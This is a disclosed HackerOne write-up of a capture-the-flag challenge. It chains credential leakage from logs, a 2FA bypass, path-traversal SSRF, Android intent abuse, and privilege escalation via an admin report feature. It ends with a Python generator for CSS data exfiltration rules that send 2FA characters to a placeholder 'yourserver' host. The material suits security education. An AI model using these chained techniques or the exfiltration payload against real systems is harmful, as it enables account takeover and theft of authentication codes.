# [H1-2006 2020]  36 hours of brain cycles utilized on solving a neat puzzle

## Report Details
- **Report ID**: 889793
- **URL**: https://hackerone.com/reports/889793
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-06-03T04:02:07.323Z
- **Disclosed**: 2020-06-18T15:23:00.507Z

## Reporter
- **Username**: 0xatul
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Here we go:
{F852423}
# Recon:
The given scope is: `*.bountypay.h1ctf.com` 
Found subdomains:
```
bountypay.h1ctf.com
api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
www.bountypay.h1ctf.com
```

Relevant GitHub repository: https://github.com/bounty-pay-code/request-logger.git

I also found this looking after the repository above and found this path on the subdomain: https://app.bountypay.h1ctf.com/bp_web_trace.log
 which has the following info:
 ```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```
which looks like `timestamp:base64` after decoding it looks like:
 ```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}  
 ```
 so now we have creds to the account for the user with the `username:password` `brain.oliver:V7h0inzX`.
 
# Initial Foothold
 
 Lets login now. After using the creds to login in we get greeted by the 2FA screeen: which can easily be bypassed by sending this request:
 ```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 110
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
 ```
 This happened because the `challenge` was the md5sum of `challenge_answer`, after logging in as `brian.oliver` we see that we have nothing to do so far. Lets check other subdomains out now:
```
https://software.bountypay.h1ctf.com -> needs to be accessed internally | an SSRF would help 
https://www.bountypay.h1ctf.com -> nothing much 
https://staff.bountypay.h1ctf.com -> staff portal = Dont have creds yet
https://bountypay.h1ctf.com -> samething as the www thing
https://app.bountypay.h1ctf.com -> main app
https://api.bountypay.h1ctf.com -> The api that handles stuff
``` 

Lets focus on the cookie after we logged in: 
```
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```
upon playing around with the token and the api, I figured the token was basically a path being queryed to the api and a hash which was vulnerable to path travsersal. and the api had a redirection feature whitelisted to `https://www.google.com/search?q=` and `https://software.bountypay.h1ctf.com` was accessbible via the redirect uri as shown in the following request and the response:
Request:
```
GET /statements?month=11&year=2016 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOlwvXC9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==

6
```
Response:
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 02 Jun 2020 09:42:09 GMT
Content-Type: application/json
Connection: close
Content-Length: 1605

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=11&year=2016","data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
```

here is the beautified HTML taken from the reponse:
```html
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Software Storage</title>
      <link href="/css/bootstrap.min.css" rel="stylesheet">
   </head>
   <body>
      <div class="container">
         <div class="row">
            <div class="col-sm-6 col-sm-offset-3">
               <h1 style="text-align: center">Software Storage</h1>
               <form method="post" action="/">
                  <div class="panel panel-default" style="margin-top:50px">
                     <div class="panel-heading">Login</div>
                     <div class="panel-body">
                        <div style="margin-top:7px"><label>Username:</label></div>
                        <div><input name="username" class="form-control"></div>
                        <div style="margin-top:7px"><label>Password:</label></div>
                        <div><input name="password" type="password" class="form-control"></div>
                     </div>
                  </div>
                  <input type="submit" class="btn btn-success pull-right" value="Login">            
               </form>
            </div>
         </div>
      </div>
      <script src="/js/jquery.min.js"></script><script src="/js/bootstrap.min.js"></script>
   </body>
</html>
```

upon changing the cookie: 
```
GET /statements?month=11&year=2016 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOlwvXC9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tXC91cGxvYWRzIyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9

6
```

we get another interesting response:
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 02 Jun 2020 09:47:20 GMT
Content-Type: application/json
Connection: close
Content-Length: 489

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads#\/statements?month=11&year=2016","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

we can just download the apk via the site

https://software.bountypay.h1ctf.com/uploads/BountyPay.apk

TLDR;
{F853143}

# Tackling my JAVA illitracy | Android side quest:  

{F853125}

when I opened the app and entered by username as well as my twitter handle and clicked on the bounty pay logo it asked me to use intents and parameters, so I looked at the android manifest and looked at the intents, tried reading the code until things worked out, and here is the solution 

Step 1:
{F853139}
```
adb shell am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" -n bounty.pay/.PartOneActivity
```
Step 2:
{F853140}
```
adb shell am start -a android.intent.action.VIEW -d "two://part?two=light\&switch=on" -n bounty.pay/.PartTwoActivity 
```
a hash showed up on the screen which on decryption was `Token` and the form asked for the header and we all know that custom headers begin with `X-` so, I  entered X-Token on the form taking us to the last step. 
Step 3:
{F853141}
```
adb shell am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" -n bounty.pay/.PartThreeActivity
```
which gets stored on the file `/data/data/bounty.pay/shared_prefs/user_created.xml` so on viewing it:  
```
adb shell cat ./data/data/bounty.pay/shared_prefs/user_created.xml
```

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?> 
<map> 
    <string name="PARTTWO">COMPLETE</string> 
    <string name="USERNAME">0xatul</string> 
    <string name="HOST">http://api.bountypay.h1ctf.com</string> 
    <string name="PARTONE">COMPLETE</string> 
    <string name="TWITTERHANDLE">atul_hax</string> 
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string> 
</map> 

```
and we can enter `8e9998ee3137ca9ade8f372739f062c1` on the form pop-up and the android bit of the challenge is solved. 
# Damn Sandra!
{F853145}
so from the hint I looked at the the list of accounts the [account](https://twitter.com/bountypayhq) is following, and I saw a user named [Sandra](https://twitter.com/SandraA76708114) who leaked their staff_id on twitter. As we grabbed a token from the android bit, so using the token `X-Token: 8e9998ee3137ca9ade8f372739f062c1` on the request we can create a new account as Sandra
request: 
```
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```

Response:
```
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 02 Jun 2020 09:56:48 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

now we can login as Sandra on staff portal. 

# Privesc 

**place holder for notes** 

After logging in I saw a really interesting JS file which could possibly abused by an attacker to privesc Sandra from a normal user to a privileged user: 
```js
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}),
$(".tab").click(function() {
    return $(".tab").removeClass("active"),
    $(this).addClass("active"),
    $("div.content").addClass("hidden"),
    $("div.content-" + $(this).attr("data-target")).removeClass("hidden"),
    !1
}),
$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }),
    $("#myModal").modal("hide")
}),
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"),
"#tab2" === document.location.hash && $(".tab2").trigger("click"),
"#tab3" === document.location.hash && $(".tab3").trigger("click"),
"#tab4" === document.location.hash && $(".tab4").trigger("click"));
``` 
so what can we derive from this?
we can pass the a click action from one of those `tab` and use `upgradeToAdmin` from a class we can control to get admin privilege for ourselves. if we try to do that by ourself we get a 401,  so what can we do to solve the problem? 
{F853117}
## Step 1:  What we can control? Having an impact of XSS without an XSS
i. Change avatar, intercept the request, and the value `profile_avatar` to `upgradeToAdmin+tab3`  this will allow you to make an XHR request with a click action using the `document.location.hash` 
ii.  so opening `https://staff.bountypay.h1ctf.com/?template=home` on the browser to make a request to /admin/upgrade?username=undefined

## Step 2: 
The app is buit on php and you can send multiple values for a single parameter on a single GET request using an array, reference to [stackoverflow](https://stackoverflow.com/questions/24059773/correct-way-to-pass-multiple-values-for-same-parameter-name-in-get-request)  where I learned about it. 
so we can do this to pass the username to the parameter: https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=home&#tab3 

## Step 3: 
Since that feature is admin only we have only way to get it be executed by an admin i.e. send a report to the admin, How does that work?
when you send a request to the admin it gets sent via an XHR request to the following URL:
```
https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZT1ob21l
```
when we decode the value of the url parameter we get this: 

```
/?template=home
```
and anything to the `/admin` path is ignored for security reasons so we take our neat little payload from the last step, encode it to base64, and it to the admin we can just intercept the request using the report feature and change the value with :

```
/?template[]=login&username=sandra.allison&template[]=home&#tab3 
```
encoded to base64: 
```
Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjM=
```
basically this request: 
```
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjM= HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMM0hqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHb1Nxbit2VURkS055dTZ6R09VbjVLY3FNTy9uR0JVRUQwY0NsMXFaMVl1SzE3UT09
```
That upgrades us to the god mode and we have credentials to the account we need: 
{F853122}

# Finishing touch | CSS data exfiltration: 

After we get the credentials we needed, we just log in and see the transactions at May 2020, and make a payment, But there is a 2FA you need to solve to make a payment which gets you the flag, by looking at the proxy logs on burp we can see that the request loads a CSS file where if you replace the link with your server you get a pingback to your server with the `user-agent: headless chrome`, so we can load our own CSS file which has a popular attack vector for data exfiltration [reference](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)
so you need to host your own CSS on your server, by finding out the element manually, and then you can use a simple script to generate a CSS file for you for example: 
```python
import string
def get_css_block(id, char):
    return "input[name=" + str(id) + "][value=\"" + str(char) + "\"] ~ *{\n    background-image: url(https://yourserver/exfil_" + str(id) + "/" + str(char) + ");\n}\n"

with open("uni_2fa_style.css", "a") as css_file:
    codes = ['code_1', 'code_2', 'code_3', 'code_4', 'code_5', 'code_6']
    letters = ''.join([chr(i) for i in range(33, 128)])
    for code in codes:
        for letter in letters:
            css_file.write(get_css_block(code, letter))
```

so you click on the send challenge button and then modify the request like the following: 
```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 42
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2FYOURSERVER%2FLOCATION%2FTO%2FCSS
```
and there are the characters of the 2FA code flowing in:
{F853110}
I got from 4-6 characters while doing this multiple times so I used yurbo intruder to get the last one, and that reveals the flag for us: 
{F853115}

## Impact

**Hacker can login and pay the bounty as Hackerone CEO.**

Thank you for organizing this CTF, had a great time solving the CTF and was a great test of my problem solving skills 

^Note: English is not my first language so please excuse me of any language and grammar errors^

## Attachments
- CTF.png
- callback.png
- flag.png
- privesc.png
- godmode.png
- android.png
- android-1.png
- android-2.png
- android-3.png
- foothold.png
- sandra.png
